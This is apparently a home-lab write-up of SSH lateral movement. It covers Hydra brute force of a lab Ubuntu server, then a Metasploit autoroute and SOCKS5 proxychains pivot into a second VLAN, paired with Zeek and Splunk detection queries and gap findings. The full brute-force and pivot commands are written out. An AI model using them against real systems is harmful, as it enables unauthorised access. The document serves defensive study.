# A06 — Lateral Movement via SSH (VLAN20 Pivot)

## Overview

This scenario simulates lateral movement from the VLAN10 attacker (Kali) into VLAN20 via SSH brute force and Meterpreter SOCKS proxy pivot. Two attack paths are documented — Path A uses direct Hydra SSH brute force against Ubuntu Server, Path B uses an established Meterpreter session with autoroute and SOCKS5 proxy to pivot into VLAN20.

**OWASP Category:** A07:2021 — Identification and Authentication Failures  
**MITRE ATT&CK:** T1110.001 (Brute Force), T1021.004 (SSH), T1090.001 (SOCKS Proxy), T1599 (Network Boundary Bridging)  
**Lab Date:** 5 June 2026  
**Attacker:** Kali Linux — 10.10.10.5 (VLAN10)  
**Pivot Host:** Ubuntu Server — 10.10.10.20 / 10.10.20.10 (dual-homed)  
**Target:** Ubuntu Server VLAN20 interface — 10.10.20.10  
**SIEM:** Splunk Enterprise + Zeek 8.0.8  

---

## Lab Network Architecture

```
VLAN10 (10.10.10.0/24)          VLAN20 (10.10.20.0/24)
┌─────────────┐                 ┌─────────────────────┐
│ Kali        │                 │ Ubuntu Server        │
│ 10.10.10.5  │──── SSH ───────▶│ 10.10.10.20 (VLAN10)│
│ (attacker)  │                 │ 10.10.20.10 (VLAN20) │
└─────────────┘                 └─────────────────────┘
                                         │
                                  FortiGate inter-VLAN
                                  routing (10.10.20.1)
```

---

## Attack Path A — Hydra SSH Brute Force

| Phase | Action | MITRE | Tool |
|-------|--------|-------|------|
| 1 | Nmap SSH version scan | T1046 | nmap |
| 2 | Hydra SSH brute force | T1110.001 | hydra |
| 3 | SSH login with cracked credentials | T1021.004 | ssh |
| 4 | Enumerate VLAN20 from pivot host | T1016 | ip route, ifconfig |

### Commands

```bash
# Phase 1 — SSH discovery
nmap -sV -p 22 10.10.10.20

# Phase 2 — Brute force (cracked in 11 seconds)
hydra -l testuser -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.20 -t 4

# Phase 3 — Login
ssh testuser@10.10.10.20
# Password: password123!

# Phase 4 — VLAN20 enumeration
ip route show
ifconfig
ping 10.10.20.1
```

### Detection — Zeek ssh.log

```
client: *libssh*
```

Hydra uses libssh — Zeek ssh.log captures `client: libssh_0.12.0` — definitive Hydra fingerprint.

---

## Attack Path B — Meterpreter SOCKS5 Pivot

| Phase | Action | MITRE | Tool |
|-------|--------|-------|------|
| 1 | Establish Meterpreter session on Windows 10 | T1059.001 | msfvenom + msf |
| 2 | Add autoroute to VLAN20 via Ubuntu Server | T1599 | Metasploit autoroute |
| 3 | Start SOCKS5 proxy on Kali port 1080 | T1090.001 | Metasploit socks_proxy |
| 4 | Configure proxychains to use SOCKS5 | T1090 | proxychains |
| 5 | SSH to Ubuntu Server VLAN20 via proxy | T1021.004 | proxychains + ssh |
| 6 | Reach VLAN20 targets | T1021 | proxychains + nmap |

### Commands

```bash
# Metasploit — after Meterpreter session established
use post/multi/manage/autoroute
set SESSION 1
set SUBNET 10.10.20.0
set NETMASK 255.255.255.0
run

# Start SOCKS5 proxy
use auxiliary/server/socks_proxy
set SRVPORT 1080
set VERSION 5
run -j

# Kali — configure proxychains
echo "socks5 127.0.0.1 1080" >> /etc/proxychains4.conf

# SSH via proxy into VLAN20
proxychains ssh testuser@10.10.20.10

# VLAN20 recon via proxy
proxychains nmap -sT -p 22,80,443 10.10.20.0/24
```

---

## Detection

### Zeek ssh.log — Hydra fingerprint
```
client: *libssh*          # Hydra SSH brute force
auth_success: true        # Successful login after failures
```

### Splunk — auth.log (Ubuntu Server — installed this session)
```spl
index=main host="ubuntu-server-vlan20" sourcetype="linux_secure"
| search "Failed password" OR "Accepted password"
| rex field=_raw "(?P<result>Failed|Accepted) password for (?P<user>\S+) from (?P<src_ip>\S+)"
| stats count by result, user, src_ip
| where count > 5
```

### Splunk — Sysmon EID 3 (Meterpreter C2)
```spl
index=sysmon EventCode=3 DestinationPort=4444
| table _time, Image, SourceIp, DestinationIp, DestinationPort
```

---

## Key Findings

- **Hydra cracked SSH in 11 seconds** — `testuser:password123!` — weak credential policy
- **libssh fingerprint** in Zeek is a reliable, low-false-positive Hydra indicator
- **auth.log was NOT in Splunk** before this session — P1 detection gap now closed (Splunk UF installed)
- **fail2ban not installed** — SSH brute force completed without lockout — P2 gap pending
- **VLAN20 reachable** from VLAN10 via dual-homed Ubuntu Server — network segmentation partially effective

## CVSS v4.0 Score

**Base Score: 8.1 (High)**
- Attack Vector: Network
- Attack Complexity: Low
- Privileges Required: None
- User Interaction: None
- Confidentiality: High (VLAN20 access gained)
- Integrity: High
- Availability: Low
